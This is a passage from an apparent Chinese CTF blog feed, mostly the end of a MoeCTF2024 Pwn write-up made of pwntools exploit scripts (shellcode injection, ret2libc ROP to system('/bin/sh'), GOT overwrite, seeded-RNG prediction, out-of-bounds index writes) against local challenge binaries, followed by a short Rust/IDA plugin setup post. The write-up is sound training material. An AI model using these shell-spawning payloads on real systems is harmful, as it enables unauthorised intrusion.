u32(io.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><br>sla(<span class="hljs-string">&quot;Tell me your age:&quot;</span>,<span class="hljs-string">b&#x27;256&#x27;</span>)<br>ru(<span class="hljs-string">&quot;Here is a gift for you :\n&quot;</span>)<br>st=<span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;st=&#x27;</span>,st)<br>shellcode=asm(shellcraft.sh())<br>payload=shellcode.ljust(<span class="hljs-number">0x68</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)+p64(st)<br>ru(<span class="hljs-string">&quot;What do you want to say?&quot;</span>)<br>sl(payload)<br>inter()<br></code></pre></td></tr></table></figure><h2 id="prelibc"><a href="#prelibc" class="headerlink" title="prelibc"></a>prelibc</h2><p>ret2libc,gadgets去libc里找</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724297766310-baa106b1-aeb1-4079-be94-d45bbe403f00.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import *</span><br><br>filename=<span class="hljs-string">&#x27;./prelibc&#x27;</span><br>elf = ELF(filename)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>io = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">38311</span>)<br><span class="hljs-keyword">else</span>:<br>io = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdb</span>():<br>    gdb.attach(io)<br>    pause(<span class="hljs-number">1</span>)   <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-keyword">return</span> u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-comment">#return u32(io.recv()[0:4])</span><br><br>output = io.recvline_contains(<span class="hljs-string">b&#x27;I give you an address in libc:&#x27;</span>)<br>puts_addr = <span class="hljs-built_in">int</span>(output.split(<span class="hljs-string">b&#x27;: &#x27;</span>)[<span class="hljs-number">1</span>].strip().rstrip(<span class="hljs-string">b&#x27;.&#x27;</span>), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi=libc_base+<span class="hljs-number">0x2a3e5</span><br>ret=libc_base+<span class="hljs-number">0x29139</span><br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>))<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x9</span>+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)<br>sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,payload)<br>inter()<br></code></pre></td></tr></table></figure><h2 id="preshellcode"><a href="#preshellcode" class="headerlink" title="preshellcode"></a>preshellcode</h2><p>调用系统函数getshell</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724290549088-05b11161-b092-46c9-83cf-2dd68ceca901.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import *</span><br><br>filename=<span class="hljs-string">&#x27;./preshellcode&#x27;</span><br>elf = ELF(filename)<br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>io = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">36321</span>)<br><span class="hljs-keyword">else</span>:<br>io = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdb</span>():<br>    gdb.attach(io)<br>    pause(<span class="hljs-number">1</span>)   <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-comment">#return u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="hljs-keyword">return</span> u32(io.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><br>payload=asm(shellcraft.sh())<br>sla(<span class="hljs-string">&#x27;Give me your code, and I will execute it.&#x27;</span>,payload)<br><br>inter()<br></code></pre></td></tr></table></figure><h2 id="prerandom"><a href="#prerandom" class="headerlink" title="prerandom"></a>prerandom</h2><p>第一次随机可以预测且必须正确</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724308251808-36acb53a-3495-4c9a-ac1b-6ef06228eec7.png" class="" title="img"><p>用c跑出随机数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tm</span> *<span class="hljs-title">local_time</span>;</span><br>    <span class="hljs-type">time_t</span> timer;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> secret;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> guess;<br><br>    timer = time(<span class="hljs-number">0</span>);<br>    local_time = localtime(&amp;timer);<br><br>    srandom(local_time);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br><br>        secret = random() % <span class="hljs-number">90000</span> + <span class="hljs-number">10000</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%u,&quot;</span>, secret);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>from pwn import *<br>from <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">import</span> <span class="hljs-title">pack</span></span><br><span class="hljs-class"><span class="hljs-title">import</span> <span class="hljs-title">random</span></span><br><span class="hljs-class"><span class="hljs-title">import</span> <span class="hljs-title">time</span></span><br><span class="hljs-class">#<span class="hljs-title">from</span> <span class="hljs-title">LibcSearcher</span> <span class="hljs-title">import</span> *</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">filename</span>=</span><span class="hljs-string">&#x27;./prerandom&#x27;</span><br><span class="hljs-meta">#elf = ELF(filename)</span><br><span class="hljs-meta">#libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>io = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">33481</span>)<br><span class="hljs-keyword">else</span>:<br>io = process(filename)<br><br>current_time = <span class="hljs-type">int</span>(time.time())<br><br><br>local_time = time.localtime(current_time)<br>tm_yday = local_time.tm_yday<br>print(<span class="hljs-string">&#x27;tm_yday=&#x27;</span>,tm_yday)<br><br>random.seed(<span class="hljs-number">0x1c</span>)<br><br><br>def s(a) : io.send(a)<br>def sa(a, b) : io.sendafter(a, b)<br>def sl(a) : io.sendline(a)<br>def sla(a, b) : io.sendlineafter(a, b)<br>def r() : <span class="hljs-keyword">return</span> io.recv()<br>def pr() : print(io.recv())<br>def ru(a) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br>def inter() : io.interactive()<br>def gdb():<br>    gdb.attach(io)<br>    pause(<span class="hljs-number">1</span>)   <br>def get_addr():<br><span class="hljs-meta">#return u64(io.recvuntil(b<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-6:].ljust(8, b<span class="hljs-string">&#x27;\x00&#x27;</span>))</span><br><span class="hljs-keyword">return</span> u32(io.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><br>a=[<span class="hljs-number">42939</span>,<span class="hljs-number">82233</span>,<span class="hljs-number">11977</span>,<span class="hljs-number">49364</span>,<span class="hljs-number">43107</span>,<span class="hljs-number">26433</span>,<span class="hljs-number">12595</span>,<span class="hljs-number">26204</span>,<span class="hljs-number">20274</span>,<span class="hljs-number">26550</span>]<br><span class="hljs-keyword">for</span> i in range(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>):<br><span class="hljs-meta">#secret = random.randint(10000,100000)</span><br><span class="hljs-meta">#print(<span class="hljs-string">&#x27;secret=&#x27;</span>,secret)</span><br>sla(<span class="hljs-string">&quot;Guess a five-digit number I&#x27;m thinking of\n&gt; &quot;</span>,str(a[i]))<br><br><br>sla(<span class="hljs-string">&quot;Guess a five-digit number I&#x27;m thinking of\n&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Guess a five-digit number I&#x27;m thinking of\n&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><br>inter()<br></code></pre></td></tr></table></figure><h2 id="flag-helper"><a href="#flag-helper" class="headerlink" title="flag_helper"></a>flag_helper</h2><p>不能直接读flag，open需要有参数flags</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723464821414-4d2f325a-c38d-4865-8d9b-9589a60a840b.png" class="" title="img"><p>需要mmap开辟空间</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723465094787-80ce1c5a-4cd8-40f5-967e-b2f999556058.png" class="" title="img"><p>需要mmap</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723465110295-856994d2-cc1a-4a01-ba87-652deeaea894.png" class="" title="img"><p>等价于两条命令open(‘&#x2F;flag’,0);mmap(7,34)（部分参数题目没问就省略了，7代表rwx，34是常见的flags值），fd012分别表示标准输入，输出，错误，加上flag前面open的两个文件，所以fd为5</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723465443987-dbe8d25a-9831-4b8f-8d5d-ab5782a5cfe6.png" class="" title="img"><h2 id="pregot-1"><a href="#pregot-1" class="headerlink" title="pregot-1"></a>pregot-1</h2><p>got表可写</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1727671790676-7b01f6af-ee3f-4d0b-b940-268858a41f5c.png" class="" title="img"><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1725765690130-cc3530a1-a25e-4dc7-a068-0fd65d5198b9.png" class="" title="img"><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1725765705563-5150f599-e587-464f-b35f-5aedc6999025.png" class="" title="img"><p>这里不能直接调用plt表，而是写0x401056</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1727671828625-3f15e4d3-83aa-48e8-a4be-21e176fa9e93.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment">#from LibcSearcher import *</span><br><br>filename=<span class="hljs-string">&#x27;./pregot&#x27;</span><br>elf = ELF(filename)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>io = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">33953</span>)<br><span class="hljs-keyword">else</span>:<br>io = process(filename)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdb1</span>():<br>    gdb.attach(io)<br>    pause(<span class="hljs-number">1</span>)   <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-comment">#return u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="hljs-keyword">return</span> u32(io.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><br><span class="hljs-comment">#gdb.attach(io)</span><br><br><span class="hljs-comment">#system_addr=elf.plt[&#x27;system&#x27;]</span><br>system_addr=<span class="hljs-number">0x401056</span><br><span class="hljs-comment">#print(&#x27;sys:&#x27;,hex(system_addr))</span><br>unreachable_addr=<span class="hljs-number">0x401196</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(system_addr)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(unreachable_addr)<br>s(payload)<br>inter()<br></code></pre></td></tr></table></figure><p>给的是一个结构体，直接玩肯定玩不出来，看到数组想到下标越界</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723540870980-9f33a9a2-4215-4363-9bb5-b5dea8b74912.png" class="" title="img"><p>还能修改其实就是任意地址改写，直接把距离改大会告诉我不过，后面考虑改速度，速度大一点好像没事，不用距离刚刚好</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-comment">#from LibcSearcher import *</span><br><br><span class="hljs-comment">#filename=&#x27;./lockedshell&#x27;</span><br><span class="hljs-comment">#elf = ELF(filename)</span><br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>io = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">33241</span>)<br><span class="hljs-keyword">else</span>:<br>io = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdb</span>():<br>    gdb.attach(io)<br>    pause(<span class="hljs-number">1</span>)   <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-comment">#return u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="hljs-keyword">return</span> u32(io.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><br>ru(<span class="hljs-string">&#x27;&gt;&#x27;</span>)<br><br>sl(<span class="hljs-string">&#x27;1&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Which engine?\n&#x27;</span>,<span class="hljs-string">&#x27;-16&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Thrust in percentage (0 ~ 100).\n&#x27;</span>,<span class="hljs-string">&#x27;32&#x27;</span>)<br>sl(<span class="hljs-string">&#x27;1&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Which engine?\n&#x27;</span>,<span class="hljs-string">&#x27;-15&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Thrust in percentage (0 ~ 100).\n&#x27;</span>,<span class="hljs-string">&#x27;16&#x27;</span>)<br>sl(<span class="hljs-string">&#x27;1&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Which engine?\n&#x27;</span>,<span class="hljs-string">&#x27;-5&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Thrust in percentage (0 ~ 100).\n&#x27;</span>,<span class="hljs-string">&#x27;50&#x27;</span>)<br><br><br>inter()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>比赛wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>z3</tag>
      
      <tag>tea魔改</tag>
      
      <tag>cython</tag>
      
      <tag>栈迁移</tag>
      
      <tag>sm4加密</tag>
      
      <tag>shellcode</tag>
      
      <tag>迷宫</tag>
      
      <tag>反调试</tag>
      
      <tag>e语言</tag>
      
      <tag>爆破flag</tag>
      
      <tag>格式化字符串</tag>
      
      <tag>SROP</tag>
      
      <tag>RSA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>配置Rust环境</title>
    <link href="/2024/09/19/%E9%85%8D%E7%BD%AERust%E7%8E%AF%E5%A2%83/"/>
    <url>/2024/09/19/%E9%85%8D%E7%BD%AERust%E7%8E%AF%E5%A2%83/</url>
    
    <content type="html"><![CDATA[<img src="/2024/09/19/%E9%85%8D%E7%BD%AERust%E7%8E%AF%E5%A2%83/1696415384519-dc0a7f0b-c7f0-4379-8558-b49fe6933570.png" class="" title="img"><p>安装rust</p><img src="/2024/09/19/%E9%85%8D%E7%BD%AERust%E7%8E%AF%E5%A2%83/1726708340945-2b3a275c-6ab9-40d1-8aee-f8f92ff29407.png" class="" title="img"><p>要安装rs-dml</p><img src="/2024/09/19/%E9%85%8D%E7%BD%AERust%E7%8E%AF%E5%A2%83/1696415444700-6bf469ce-7b26-4297-b032-8de9a45d4481.png" class="" title="img"><p>点进rs-dml，发现要先build</p><img src="/2024/09/19/%E9%85%8D%E7%BD%AERust%E7%8E%AF%E5%A2%83/1696415700117-c58d91ce-3cd7-40a3-bb2c-2a5d497e527c.png" class="" title="img"><p>build</p><img src="/2024/09/19/%E9%85%8D%E7%BD%AERust%E7%8E%AF%E5%A2%83/1696415430313-ffd6e315-c182-4e5b-8d10-a1e37845db07.png" class="" title="img"><p>把插件中的IDARustDemangler.py放到plugins目录</p><img src="/2024/09/19/%E9%85%8D%E7%BD%AERust%E7%8E%AF%E5%A2%83/1696415797028-4b99536d-7d36-40fc-97af-55dbb6814c38.png" class="" title="img"><p>打开发现没有识别到<img src="/2024/09/19/%E9%85%8D%E7%BD%AERust%E7%8E%AF%E5%A2%83/1696415885331-e9ed7bcf-2e25-4bac-ae99-a151f87acfa3.png" class="" title="img"></p><p>要去配系统变量的path，把release文件放到path中</p><img src="/2024/09/19/%E9%85%8D%E7%BD%AERust%E7%8E%AF%E5%A2%83/1696415970899-506210c4-87fc-4e30-9f43-bc336e053699.png" class="" title="img"><p>这样就完成了</p>]]></content>
    
    
    <categories>
      
      <category>环境配置</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>浙江省省赛2023决赛复现</title>
    <link href="/2024/08/10/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/08/10/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/</url>
    
